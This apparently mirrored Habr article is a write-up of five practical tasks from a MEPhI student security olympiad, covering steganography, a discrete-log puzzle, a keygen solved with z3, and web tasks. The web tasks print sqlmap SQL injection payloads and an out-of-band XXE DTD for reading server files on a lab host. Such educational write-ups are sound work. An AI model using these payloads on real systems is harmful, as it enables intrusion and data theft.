<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>CTF from the Ministry of Education and Science: analysis of information security challenges</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Every year MEPhI holds a student information security competition. This is a very unusual event, very different from the usual task-based CTF. It's fu...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>CTF from the Ministry of Education and Science: analysis of information security challenges</h1><div class="post__text post__text-html js-mediator-article">  Every year MEPhI holds a student information security competition.  This is a very unusual event, very different from the usual task-based CTF.  It's funny that the Olympiad has an official status and is even recognized by the Ministry of Education, but few know about it.  Moreover, its winners and prize-winners have the opportunity to enter the MEPI without exams. <br><br>  If you are eager to stretch your brains and test your knowledge in the field of infobox, read our analysis of five more interesting tasks of the practical round of the Olympiad. <br><a name="habracut"></a><br>  The Olympiad is divided into two rounds: theoretical and practical.  They last 3 hours a day with a short break.  The theoretical tour is similar to the exam: the first task consists of 5 questions on cryptography and cryptanalysis, where you need to give a detailed answer.  The second task is a big test of information technology security.  A trial version of the theoretical tour is presented by <a href="http://olymp.mephi.ru/is2018/doc/sample_problems.pdf">reference</a> . <br><br>  A practical tour is to solve 10 relatively simple tasks related to programming, reverse engineering, web exploitation, cryptography and steganography.  When performing these tasks, you can use your own computer, but without access to the Internet and external storage media. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Participation in this Olympiad is an interesting experience for any security student, allowing you to test both theoretical and practical knowledge. <br><br><h3>  Task H, 2018 </h3><br>  <b>Condition:</b> <i>Arriving at the meeting place in the park, you saw no one, however, walking along one of the avenues, you found a locked phone with a strange screen saver.</i>  <i>Find the password encrypted in the splash image and send it for verification through the form below.</i> <br><br><div class="spoiler">  <b class="spoiler_title">Picture</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/eb/-o/6h/eb-o6hqvbcpcqvhgnrbyypezv5s.jpeg" alt="image"><br></div></div><br>  The tasks of searching for stegocontainers in images are usually solved in three stages, from simple to complex: <br><br><ol><li>  Meta information check: EXIF ‚Äã‚Äãfor jpeg, IDF for png </li><li>  Structure check: search for ascii strings, search for other files added to the end of the image </li><li>  Analysis of the image itself: checking the compliance of the header with the data, changing the color map, bruising the LSB \ MSB </li></ol><br>  First, check the file type: <br><br><pre><code class="bash hljs">$ file H.jpg H.jpg: JPEG image data, JFIF standard 1.02, resolution (DPI), density 96x96, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=8, datetime=2009:03:12 13:48:39], baseline, precision 8, 1024x768, frames 3</code> </pre> <br>  We obtain meta information from EXIF ‚Äã‚Äãusing the exiftool utility and find the first part of the flag in the Creator field: <br><br><pre> <code class="bash hljs">$ exiftool H.jpg | grep Creator Creator                         : part1 - 2b33f7c863ef8b</code> </pre> <br>  We continue to analyze the file using the binwalk utility: <br><br><pre> <code class="bash hljs">$ binwalk H.jpg | grep -v <span class="hljs-string"><span class="hljs-string">'Unix path'</span></span> DECIMAL       HEXADECIMAL  DESCRIPTION -------------------------------------------------------------------------------- 0             0x0  JPEG image data, JFIF standard 1.02 46            0x2E  TIFF image data, big-endian, offset of first image directory: 8 628320        0x99660  Zip archive data, at least v2.0 to extract, compressed size: 21, uncompressed size: 19, name: part2.txt 628471        0x996F7  End of Zip archive 628493        0x9970D  PNG image, 385 x 338, 8-bit/color RGBA, non-interlaced 628584        0x99768  Zlib compressed data, compressed</code> </pre><br>  We see that at offset 0x99660 there is a Zip-archive with the part2.txt file, and at offset 0x9970D - a png-image. <br><br>  With binwalk we can get these files and even automatically unzip the zip archive. <br><br><pre> <code class="bash hljs">$ binwalk -D <span class="hljs-string"><span class="hljs-string">'zip archive:zip:unzip %e'</span></span> -D <span class="hljs-string"><span class="hljs-string">'png image:png'</span></span> H.jpg $ <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> _H.jpg.extracted $ ls 99660.zip  996F7.zip 9970D.png  99768 99768.zlib part2.txt $ cat part2.txt part 2 - 6b9efd1b89</code> </pre><br>  9970D.png: <br><br><img src="https://habrastorage.org/webt/op/-u/-t/op-u-tzw5s74ny4itni_qpqiv5k.png" alt="image"><br><br>  Putting all the parts of the flag together - the task is solved. <br><br><h2>  Task A, 2016 </h2><br>  <b>Condition:</b> <i>Find the value of the $ flag variable (32 hex characters) in the following php script if it is known that the result of the script is 10899914993644372325321260353822561193.</i> <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $n = <span class="hljs-string"><span class="hljs-string">"35948145881546650497425055363061529726"</span></span>; $flag = <span class="hljs-string"><span class="hljs-string">"... 32 hex chars ..."</span></span>; <span class="hljs-comment"><span class="hljs-comment">// find the flag $x = bchexdec($flag); echo bcpowmod(1511, $x, $n); function bchexdec($dec) {   $res = 0;   $mn = 1;   $l = strlen($dec);   for($i=0;$i&lt;$l;$i++)   {     $res = bcadd($res, bcmul($mn, hexdec($dec[$l-$i-1])));     $mn = bcmul($mn, 16);   }   return $res; } </span><span class="hljs-meta"><span class="hljs-comment"><span class="hljs-meta">?&gt;</span></span></span></span></code> </pre><br>  Since the bcpowmod function builds the number 1511 to an unknown degree in the ring of residues 35948145881546650497425055363061529726, the flag is the discrete logarithm 10899914993644372325321260353822561193 on the base 1511. <br><br>  Writing a script to solve such a problem from scratch for a long time, brute force does not help either, so it‚Äôs best to use the free computer algebra system Sage. <br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/sage from sage.all import * R = IntegerModRing(35948145881546650497425055363061529726) y = 10899914993644372325321260353822561193 g = 1511 x = discrete_log(R(y), R(g)) print("Flag is: " + hex(x))</span></span></code> </pre><br>  Run Sage: <br><br><pre> <code class="bash hljs">$ sage solve.py Flag is: 1203ca52964b15cd12887d920d229</code> </pre> <br>  Substitute the flag in the script and make sure that the answer is correct: <br><br><pre> <code class="bash hljs">% php A.php 10899914993644372325321260353822561193</code> </pre> <br><h3>  Task C, 2016 </h3><br>  <b>Condition:</b> <i>Generate a serial number for your login and send a response to the check in the format login: serial number without spaces.</i> <br><br>  Get information about a binary using ExeinfoPe: <br><br><img src="https://habrastorage.org/webt/2i/ww/vy/2iwwvyn8p-_xxem9iaq1vjhqjm8.png" alt="image"><br><br>  Follow the advice and unpack the file: <br><br><pre> <code class="bash hljs">$ upx -d auth_x32.exe                      Ultimate Packer <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> eXecutables                         Copyright (C) 1996 - 2013 UPX 3.91        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Sep 30th 2013       File size         Ratio Format     Name  --------------------   ------ ----------- -----------  1427267 &lt;-    807235 56.56%    win32/pe auth_x32.exe Unpacked 1 file.</code> </pre> <br>  Define the used compiler: <br><br><img src="https://habrastorage.org/webt/t2/6q/yr/t26qyrxafvqmlqihz_jbq6crbuc.png" alt="image"><br><br>  We decompile the main function and slightly modify the output with a file: <br><br><img src="https://habrastorage.org/webt/l8/fj/2j/l8fj2jih9wjforgccmbzged_x6o.jpeg" alt="image"><br><br>  The algorithm of the program is as follows: <br><br><ol><li>  Through the command line arguments, the user login and the 32-character key in hex format are input. </li><li>  The key from hex is converted to a binary form and byte-by-word with a login. </li><li>  Then each of the elements of the resulting sequence is converted by the formula: <br><br><pre> <code class="python hljs">key[k] = <span class="hljs-number"><span class="hljs-number">2</span></span> * key[(k + <span class="hljs-number"><span class="hljs-number">1</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xF</span></span>] | (key[k] &gt;&gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) ^ key[k]</code> </pre> </li><li>  The result of the conversion using the memcmp function is compared with the correct_key byte string.  Its full value is 1136CB46FFF370685D41C348CCAD6EC7 </li></ol><br>  Compose a system of 16 equations and solve it using the z3 SMT solver: <br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python from z3 import * import binascii #   hardcode = [0x11, 0x36, 0xCB, 0x46, 0xFF, 0xF3, 0x70, 0x68, 0x5D, 0x41, 0xC3, 0x48, 0xCC, 0xAD, 0x6E, 0xC7] username = "hummelchen" ulen = len(username) #   key = [BitVec('k[{}]'.format(x), 8) for x in range(0,16)] s = Solver() #    for k in range(0, 16):   s.add(hardcode[k] == (2 * key[(k + 1) &amp; 0xF] | LShR(key[k], 7)) ^ key[k]) # ,    if s.check() != 'sat':   print('Cannot solve this system')   return model = s.model() serial = "" #       for i in range(0, 16):   h = model.evaluate(key[i]).as_long()       serial += chr(h ^ ord(username[i % ulen])) print(binascii.hexlify(serial))</span></span></code> </pre> <br>  Check the solution: <br><br><pre> <code class="bash hljs">$ auth_x32.exe hummelchen 094d6a0bf55b01e195b823316b080169 Correct</code> </pre> <br><h3>  Tasks D and E, 2016 </h3><br>  <b>Conditions:</b> <br>  <i>D: The answer to the problem is stored in one of the databases of the forgotten server.</i>  <i>Find the vulnerability on the site and read the answer with it.</i> <i><br></i>  <i>E: The answer to the problem is stored in one of the files on the server.</i>  <i>Find the vulnerability on the site and read the file with it.</i> <br><br>  The web interface of the forgotten server looks quite ascetic: just a text authorization form and the title ‚ÄúOnline bank system‚Äù. <br><br><img src="https://habrastorage.org/webt/hs/7o/yp/hs7oypfnb5a-4zh6eop6h8zflby.png" alt="image"><br><br>  Bruteforcing files and directories on the server we find password-protected phpmyadmin and robots.txt with a hint: <br><br><pre> <code class="bash hljs">$ python3 ./dirsearch.py -u http://192.168.56.11/  --exclude-status=403 -e txt Target: http://192.168.56.11/ [19:52:31] Starting: [19:52:37] 200 -  453B - /index.php                                                                            [19:52:37] 200 -  453B - /index.php/login/ [19:52:37] 301 -  318B - /javascript  -&gt; http://192.168.56.11/javascript/ [19:52:38] 301 -  318B - /phpmyadmin  -&gt; http://192.168.56.11/phpmyadmin/                           [19:52:39] 200 -    8KB - /phpmyadmin/                              [19:52:39] 200 -   55B - /robots.txt                                                                                                                                                                      Task Completed $ curl http://192.168.56.11/robots.txt I think js filter is 100% safe <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> checking user data</code> </pre> <br>  We study the source code of the authorization page and see the suspicious jquery.js script <br><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">login</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> user = $(<span class="hljs-string"><span class="hljs-string">"#user"</span></span>).val(); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> pass = $(<span class="hljs-string"><span class="hljs-string">"#pass"</span></span>).val(); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(i=<span class="hljs-number"><span class="hljs-number">0</span></span>;i&lt;user.length;i++)   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (user.charCodeAt(i) &lt; <span class="hljs-number"><span class="hljs-number">0x61</span></span> || user.charCodeAt(i) &gt; <span class="hljs-number"><span class="hljs-number">0x7a</span></span>)   {     resp(<span class="hljs-string"><span class="hljs-string">"Invalid user format"</span></span>);     <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">false</span></span>;   } <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(i=<span class="hljs-number"><span class="hljs-number">0</span></span>;i&lt;pass.length;i++)   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (pass.charCodeAt(i) &lt; <span class="hljs-number"><span class="hljs-number">0x61</span></span> || pass.charCodeAt(i) &gt; <span class="hljs-number"><span class="hljs-number">0x7a</span></span>)   {     resp(<span class="hljs-string"><span class="hljs-string">"Invalid pass format"</span></span>);     <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">false</span></span>;   } <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> auth = <span class="hljs-string"><span class="hljs-string">"&lt;auth&gt;&lt;user&gt;"</span></span>+user+<span class="hljs-string"><span class="hljs-string">"&lt;/user&gt;&lt;pass&gt;"</span></span>+pass+<span class="hljs-string"><span class="hljs-string">"&lt;/pass&gt;&lt;/auth&gt;"</span></span>; $.post(<span class="hljs-string"><span class="hljs-string">"/ajax.php"</span></span>, {<span class="hljs-string"><span class="hljs-string">"auth"</span></span>: auth}, resp); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">resp</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">data</span></span></span><span class="hljs-function">) </span></span>{ $(<span class="hljs-string"><span class="hljs-string">"#info"</span></span>).html(<span class="hljs-string"><span class="hljs-string">'&lt;font color="red"&gt;'</span></span>+data+<span class="hljs-string"><span class="hljs-string">'&lt;/font&gt;'</span></span>); }</code> </pre> <br>  We intercept a POST authorization request using Burp Suite and immediately verify the possibility of SQL injection: <br><br><img src="https://habrastorage.org/webt/np/vk/y3/npvky3tkjrxihgknkii-oxk04ka.png" alt="image"><br><br>  To automate the exploitation of a vulnerability, we save the text of the request to a file, mark the injection location with an asterisk, and load the result into sqlmap using the -r filename option: <br><br><pre> <code class="xml hljs">auth=<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">auth</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span>admin<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span>*<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">auth</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><div class="spoiler">  <b class="spoiler_title">Vulnerabilities found</b> <div class="spoiler_text"><pre> <code class="html hljs xml">Parameter: #1* ((custom) POST)   Type: boolean-based blind   Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)   Payload: auth=<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">auth</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span>admin<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span>' OR NOT 9081=9081#<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">auth</span></span></span><span class="hljs-tag">&gt;</span></span>   Type: error-based   Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)   Payload: auth=<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">auth</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span>admin<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span>' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170787871,(SELECT (ELT(7559=7559,1))),0x7170707a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- cPnm<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">auth</span></span></span><span class="hljs-tag">&gt;</span></span>   Type: AND/OR time-based blind   Title: MySQL <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">=</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">5.0.11</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">AND</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">time-based</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">blind</span></span></span><span class="hljs-tag"> (</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">heavy</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">query</span></span></span><span class="hljs-tag">)   </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Payload:</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">auth</span></span></span><span class="hljs-tag">=&lt;</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">auth</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span>admin<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span>' AND 7893=BENCHMARK(5000000,MD5(0x585a6178))-- sWuO<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">auth</span></span></span><span class="hljs-tag">&gt;</span></span>   Type: UNION query   Title: MySQL UNION query (NULL) - 1 column   Payload: auth=<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">auth</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span>admin<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span>' UNION ALL SELECT CONCAT(0x7170787871,0x61495771514b7a677663454c464c79565447794c6f4362457375535161467872446e486e4f654b53,0x7170707a71)#<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">auth</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br></div></div><br>  We determine the databases available to us: <br><br><pre> <code class="bash hljs">available databases [2]: [*] information_schema [*] site</code> </pre><br>  Get the flag for task D: <br><br><img src="https://habrastorage.org/webt/9t/cg/ya/9tcgyabfjwc8mlkzvbqits-mpac.png" alt="image"><br><br>  Since the current user is not a database administrator, we cannot read files on the host and, therefore, will have to use a different attack vector.  Let's try an XML eXternal Entity attack. <br><br>  We can force the XML parser to read the file of interest to us and use the contents of this file as a URI so that it is output in an error message. <br><br>  To do this, you need to create a special DTD file (Data Type Definition; definition of data type).  The XML parser on the server will load its contents before processing the main payload, which will allow using the% payload value as a URI. <br>  xxe.dtd: <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">!ENTITY</span></span></span><span class="hljs-tag"> % </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">err</span></span></span><span class="hljs-tag"> "&lt;!</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ENTITY</span></span></span><span class="hljs-tag"> % </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">trick</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">SYSTEM</span></span></span><span class="hljs-tag"> '%</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">payload</span></span></span><span class="hljs-tag">;'&gt;</span></span>"&gt; %err;</code> </pre> <br>  Now raise the web server using python, the xxe.dtd file should be located in its root directory. <br><br><pre> <code class="bash hljs">$ python -m SimpleHTTPServer 1234</code> </pre> <br>  Send the server a request of this type: <br><br><img src="https://habrastorage.org/webt/3z/bi/bh/3zbibh4bvf9tgg6etams9okzw64.png" alt="image"><br><br>  We get the flag for task E in the row with the user list. <br><br>  PS All tasks of the practical round of the Olympiad for this and past years are available at the links: <br>  <a href="http://olymp.mephi.ru:9000/problems.html">Practical round VSO on IB 2016</a> <br>  <a href="http://olymp.mephi.ru:9001/problems.html">Practical round VSO on IB 2017</a> <br>  <a href="http://olymp.mephi.ru:9002/problems.html">Practical round VSO on IB 2018</a> <br><br>  <i>Author: Yaroslav Shmelev, HackerU " <a href="https://hackeru.pro/pentesting%3Futm_source%3Dhabrahabr%26utm_medium%3Dpost%26utm_campaign%3Dsmarcomm_pentest">Information Security Specialist</a> " course teacher.</i> <br><br><hr><br>  Most of the teachers of the Israeli High School of IT and Security HackerU participate and occupy top places in competitions and competitions for pentest, web development, blockchain.  To become a winner, it is not enough to have only high motivation.  We need really useful knowledge and skills, and they are obtained only from the best practitioners.  If in doubt about the future, you want to learn the profession in demand, ask <a href="https://hackeru.pro/">us</a> .  We promise to get rid of all the excess and help you find yourself in the IT world. </div><p>Source: <a href="https://habr.com/ru/post/359094/">https://habr.com/ru/post/359094/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../359084/index.html">Is XMPP so bad as it is painted? How Jabber has become today</a></li>
<li><a href="../359086/index.html">Not Delisamokat one: how small usability errors create big problems with a real example</a></li>
<li><a href="../359088/index.html">Information systems with conceptual models. Part two</a></li>
<li><a href="../359090/index.html">How to programmer move to Cyprus</a></li>
<li><a href="../359092/index.html">Mobile-first indexing - Google's search revolution</a></li>
<li><a href="../359096/index.html">Understanding of homogeneous space-time</a></li>
<li><a href="../359102/index.html">Selectel IPv4 prefix route leaking</a></li>
<li><a href="../359104/index.html">How to deploy the infrastructure for Pivotal CF, or Puff Pie Recipe in pictures</a></li>
<li><a href="../359106/index.html">Work with EventSystem in Unity. Basic things in working with UI</a></li>
<li><a href="../359108/index.html">How do we hire using the bootcamp. Experience of the department of search interfaces</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>